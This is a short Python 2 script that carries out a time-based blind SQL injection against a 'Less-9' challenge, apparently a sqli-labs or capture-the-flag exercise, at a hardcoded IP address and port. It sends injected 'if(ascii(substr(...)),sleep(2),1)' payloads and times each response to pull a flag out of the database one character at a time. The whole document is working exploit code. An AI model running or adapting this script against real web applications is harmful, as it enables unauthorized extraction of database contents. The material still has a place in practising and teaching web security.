#! python2
import requests as re
name=""
chk=0
for i in xrange(1,50):
	chk+=1
	for j in range(32,126):
		url='http://47.103.137.68:7092/Less-9/?id=1%27 and if(ascii(substr('+'(select flag from flag.Less9'+' limit 0,1),'+str(i)+',1))='+str(j)+',sleep(2),1)%23'
		time=re.get(url)
		if time.elapsed.total_seconds() >2 :
			print(chr(j))
			name=name+chr(j)
			chk=0
			break
	if chk==1:
		break
print name